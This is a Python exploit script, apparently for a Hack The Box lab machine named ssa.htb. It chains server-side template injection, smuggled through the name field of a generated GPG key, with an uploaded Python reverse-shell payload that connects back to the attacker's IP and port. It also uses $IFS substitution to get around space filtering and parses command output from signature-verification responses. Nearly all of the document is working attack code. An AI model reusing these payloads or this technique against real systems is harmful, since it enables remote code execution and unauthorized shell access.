#!/usr/bin/python3
import netifaces as ni
import gnupg
import sys
import os
from urllib3.exceptions import InsecureRequestWarning
import requests
import re
from datetime import datetime
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

proxy = {"https":"http://127.0.0.1:8080"}

gpg = gnupg.GPG()

ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
port = 4455

def get_pub_key():
	key_url = "https://ssa.htb:443/pgp"
	return '\n'.join(requests.get(key_url, verify=False).text.split("\n")[1:-1])


def encrypt_message(message, public_key):
	gpg = gnupg.GPG()

	import_pub_key = gpg.import_keys(public_key)
	output_file = 'encrypted_file.gpg'

	encrypted_data = gpg.encrypt(message, import_pub_key.fingerprints, always_trust=True)

	return encrypted_data


def send_contact_message(message):
	pub_key = get_pub_key()
	enc_message = encrypt_message(message, pub_key)

	contact_url = "https://ssa.htb:443/contact"
	contact_data = {"encrypted_text": enc_message}
	requests.post(contact_url, data=contact_data, proxies=proxy, verify=False)


def create_gpg_keys_and_signature(payload, message):
	input_data = gpg.gen_key_input(
		key_type="RSA",
		key_length=4096,
		name_real=payload,
		name_email="test@test.com",
		expire_date=0,
		passphrase="asd")

	key = gpg.gen_key(input_data)

	public_key = gpg.export_keys(key.fingerprint)

	gpg.passphrase = "asd"
	signature = gpg.sign(message,keyid=key.fingerprint, detach=False, clearsign=True, passphrase="asd")
	return public_key, signature


def send_request(signature, public_key):
## sending to url
	url = "https://ssa.htb:443/process"
	cookies = {"session": "eyJfZnJlc2giOmZhbHNlfQ.ZOMRmg.t2IUclKZAiw9VqtSAy0xaZ4wAXM"}
	headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0", "Accept": "*/*", "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://ssa.htb", "Referer": "https://ssa.htb/guide", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
	data = {"signed_text": str(signature), 
	"public_key": public_key}
	r = requests.post(url, headers=headers,proxies=proxy, cookies=cookies, data=data, verify=False)
	return r.text


def extract_command_output_and_print(text):
	regex_string = r'gpg: Good signature from "(.*?)<test@test\.com>'
	reg = re.findall(regex_string, ''.join(text), re.DOTALL)

	if(len(reg) == 0):
		return []

	has_data = any(len(element.strip()) > 0 for element in reg)
	if not has_data:
		return []

	output_list = []

	for s in reg:
		if s.strip() != "":
			output_list.append(s)

	return output_list


def create_and_execute_cmd(payload, message):
	public_key, signature = create_gpg_keys_and_signature(payload, message)
	raw_output = send_request(signature, public_key)
	return extract_command_output_and_print(raw_output)


def fix_payload(payload):
	return payload.replace(" ","$IFS")


def extract_latest_file_from_dir(dir_string):

	latest_filename = None
	latest_date = None

	lines = dir_string.strip().split("\n")
	file_entries = []

	for line in lines:
		parts = line.split()
		if len(parts) >= 6:
			try:
				file_date = datetime.strptime(" ".join(parts[5:8]), '%b %d %H:%M')
				if latest_date is None or file_date > latest_date:
					if ".txt" in parts[-1]:
						latest_date = file_date
						latest_filename = parts[-1]
			except ValueError:
				pass #ignore lines that don't much expected format

	return latest_filename


python_payload_sec = f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

print("Sending contact message with malicious python script")

send_contact_message(python_payload_sec)

## find latest uploaded files:
print("Finding latest saved file")

dir_payload = '{{ self.__init__.__globals__.__builtins__.__import__("os").popen("' + fix_payload("ls -la ./SSA/submissions") + '").read() }}'
dir_data = "\n".join(create_and_execute_cmd(dir_payload, ""))
print(dir_data)
last_filename = extract_latest_file_from_dir(dir_data)
print(f"latest filename : {last_filename}")

input(f"set netcat listener on port {port}")
## execute uploaded python script
print("Executing malicious python script")
fixed_payload = fix_payload("python3 ./SSA/submissions/" + last_filename)
print(fixed_payload)
execute_payload = '{{ self.__init__.__globals__.__builtins__.__import__("os").popen("' + fixed_payload + '").read() }}'
command_output = "\n".join(create_and_execute_cmd(execute_payload, ""))
print(command_output)